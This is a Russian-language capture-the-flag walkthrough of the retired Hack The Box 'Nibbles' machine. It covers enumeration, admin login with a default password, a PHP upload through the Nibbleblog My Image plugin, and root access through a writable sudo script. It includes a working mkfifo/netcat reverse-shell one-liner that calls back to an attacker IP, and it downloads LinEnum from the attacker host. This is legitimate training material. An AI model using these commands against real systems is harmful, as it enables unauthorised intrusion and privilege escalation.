HTB — Nibbles (Retired)
Box Info

IP: 10.129.x.x (укажите актуальный из вашего VPN)
Difficulty: Easy
OS: Linux (Ubuntu-based)
Skills Demonstrated: Network scanning · Web enumeration · File upload vulnerability · Reverse shell · Privilege escalation via sudo misconfiguration

Этот walkthrough описывает полный процесс от разведки до получения root-доступа. Я структурировал его по этапам для удобства. Команды выделены в код-блоках, ключевые выводы — жирным или курсивом. Для портфолио добавил разделы с lessons learned и proofs (замените на реальные флаги). Если нужно, добавьте скриншоты в разделах (я отметил места).
1. Enumeration (Разведка)
На этом этапе сканируем порты, сервисы и веб-приложение, чтобы найти точки входа.
Nmap Scanning

Начальный скан для версий и открытых портов:Bashnmap -sV --open -oA nibbles_initial_scan 10.129.200.170(-oA сохраняет в файлы: .nmap, .xml, .gnmap для анализа)
Grepable вывод:Bashnmap -v -oG - 10.129.200.170
Полный TCP-скан всех портов:Bashnmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190
Скриптовый скан на ключевых портах:Bashnmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190
HTTP enumeration:Bashnmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190

Key Findings:

22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd <REDACTED> ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Netcat Banner Grabbing

Для SSH:Bashnc -nv 10.129.42.190 22Output: 22 (ssh) open SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
Для HTTP:Bashnc -nv 10.129.42.190 80Output: (UNKNOWN) [10.129.42.190] 80 (http) open (без баннера)

Web Application Detection

WhatWeb:Bashwhatweb 10.129.42.190
Просмотр страницы:Bashcurl http://10.129.42.190Или в браузере: Ctrl+U для исходного кода. Нашли комментарий: 
Проверка директории:Bashwhatweb http://10.129.42.190/nibbleblogПодтверждено: директория существует.

Directory Enumeration

Gobuster:Bashgobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txtНашли админ-панель и другие каталоги.

Key Findings:

Версия Nibbleblog: v4.0.3 (Codename: Coffee, Release: 2014-04-01)
Пользователь: admin (из users.xml:Bashcurl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint --format -Output: <user username="admin">)
Конфиг:Bashcurl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
Пароль: nibbles (стандартный, сработал для входа в админ-панель).

Место для скриншота: Админ-панель Nibbleblog.
2. Initial Foothold (Получение доступа)
Эксплуатируем уязвимость в плагине для загрузки файлов.

В админ-панели: Plugins → My Image → Загружаем PHP вместо изображения.
Payload (простой тест):PHP<?php system('id'); ?>
Загрузка: Получили ошибки ресайза (Warning: imagesx() и т.д.), но файл загружен.
Логически: путь к файлу — /content/private/plugins/my_image/image.php (или аналогичный из enumeration).
Обновлённый payload для reverse shell:
Локальный listener:Bashnc -lvnp 9443
Активация: Перейти в браузере на http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

Shell Stabilization:

Python PTY (для Python 3):Bashpython3 -c 'import pty; pty.spawn("/bin/bash")'(Для Python 2 не сработало, но 3 — OK. Получили полноценный терминал.)

Место для скриншота: Reverse shell в nc.
3. Privilege Escalation (Эскалация привилегий)
От пользователя nibbler до root.

Проверка скрипта:Bashcat /home/nibbler/personal/stuff/monitor.sh(Доступен для записи.)
LinEnum для автоматизированного анализа:
Локальный сервер:Bashsudo python3 -m http.server 8080
Скачивание на цель:Bashwget http://10.10.14.2:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh


Key Findings:

Sudo rights: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh(Проверка: sudo -l)
Дописываем reverse shell в скрипт:Bashecho 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.155 8443 >/tmp/f' | tee -a monitor.sh
Listener:Bashnc -lvnp 8443
Запуск:Bashsudo /home/nibbler/personal/stuff/monitor.shПолучили root-shell!

Место для скриншота: sudo -l и root-shell.
Proofs

user.txt: <REDACTED> (укажите хэш или флаг)
root.txt: <REDACTED>

Lessons Learned

Всегда проверяйте комментарии в HTML — они часто выдают скрытые директории.
Старые CMS вроде Nibbleblog уязвимы к file upload bypass (из-за слабой валидации).
NOPASSWD в sudoers — классика для easy-машин; всегда редактируйте writable скрипты.
Стабилизация шелла через PTY экономит время на интерактивные команды.
Для оптимизации: Вместо LinEnum можно было сразу sudo -l + find / -perm -u=s.